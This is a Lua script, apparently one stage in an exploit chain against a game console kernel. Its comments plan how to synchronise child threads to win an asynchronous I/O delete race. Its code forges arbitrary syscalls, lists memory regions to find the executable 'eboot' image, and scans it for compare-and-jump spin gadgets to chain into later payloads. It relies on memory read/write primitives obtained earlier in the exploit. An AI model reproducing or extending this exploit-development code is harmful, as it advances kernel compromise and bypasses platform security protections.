-- CRASH_CLASS: LOW
-- PROBE 757a: find a spin gadget in eboot
--
-- The aio delete race never overlaps: 8 children spawned one after another are
-- about a hundred microseconds apart while the whole delete is about ten, so
-- the first caller finishes and clears the slot before the second even starts
-- its first lookup. 727a saw exactly two zero statuses and six 0x80020003 in
-- every round, and the second zero is a caller that passed the first lookup
-- and lost at the re-lookup - a follower, not a second free.
--
-- To make them start together they have to wait on a memory word that the
-- parent sets once. A spin gadget is a compare against memory followed by a
-- backward conditional jump to the same compare, so the child loops until the
-- parent writes the expected value.
--
-- This scans eboot for that shape and prints the addresses. Nothing is called;
-- the probe only reads. Every candidate is reported with its compare address,
-- the register it dereferences and the value it waits for, so the next probe
-- can put one at the head of each child's chain.

print("=== PROBE 757a: EBOOT SPIN GADGET SCAN ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
print("[A] tid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

-- region list: find the executable mapping, which is eboot (prot 5, large)
local rb = to_num(memory.alloc(0x8000))
local cnt = to_num(memory.alloc(8)); wd(cnt, 0)
local rc = call(mk(674), rb, 72, 512, cnt, 0x40000000, 0)
local n = rd(cnt)
print(string.format("[A] 674 ret=%s count=%s", tostring(rc), tostring(n)))
local base, size = nil, nil
if type(n) == "number" then
    for i=0,math.min(n,512)-1 do
        local r = rb + i*72
        local lo, hi = rd(r), rd(r+4)
        local elo, ehi = rd(r+8), rd(r+12)
        local prot = rd(r+0x18)
        local a = lo + hi*4294967296
        local b = elo + ehi*4294967296
        if prot == 5 and (b-a) > 0x200000 and (a < 0x1000000000) then
            if base == nil or (b-a) > size then base, size = a, b-a end
        end
    end
end
print(string.format("[A] eboot base=%s size=%s", tostring(base), tostring(size)))

if base then
    local limit = math.min(size, 0x600000)
    local found = 0
    -- bytes of interest:
    --   83 3F imm8 75 rel8 / 74 rel8   cmp dword [rdi], imm ; jcc self
    --   41 83 3F imm8 75 rel8          cmp dword [r15], imm
    --   F7 07 ...                      test dword [rdi], reg   (skip)
    -- A pure spin has the jump target equal to the compare address.
    local prev = 0
    local i = 0
    while i < limit and found < 10 do
        local v = rq(base + i)
        if v == nil then break end
        -- keep a rolling window of 6 bytes
        local b0 = prev % 256
        local b1 = math.floor(prev/256) % 256
        local b2 = math.floor(prev/65536) % 256
        local b3 = math.floor(prev/16777216) % 256
        local nb = {}
        for k=0,5 do nb[k] = math.floor(v / (2^(8*k))) % 256 end
        local bytes = {b0,b1,b2,b3,nb[0],nb[1],nb[2],nb[3],nb[4],nb[5]}
        -- window start offsets relative to (i-4)
        for w=0,4 do
            local a1 = bytes[w+1]; local a2 = bytes[w+2]; local a3 = bytes[w+3]
            local a4 = bytes[w+4]; local a5 = bytes[w+5]
            if a1 == 0x83 and a2 and a3 and a2 >= 0x38 and a2 <= 0x3F and (a4 == 0x75 or a4 == 0x74) and a5 then
                local cmpaddr = base + (i-4) + w
                local rel = a5
                if rel > 127 then rel = rel - 256 end
                local target = cmpaddr + 4 + rel
                if target == cmpaddr then
                    found = found + 1
                    print(string.format("[B] spin cmp=%08X reg=[%02X] wait=%02X jcc=%s", cmpaddr, a2-0x38, a3, (a4==0x75 and "jne" or "je")))
                end
            end
        end
        prev = v % 4294967296
        i = i + 4
    end
    print(string.format("[B] candidates=%d scanned=%X", found, math.min(i,limit)))
end
print("[C] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 757a DONE ===")
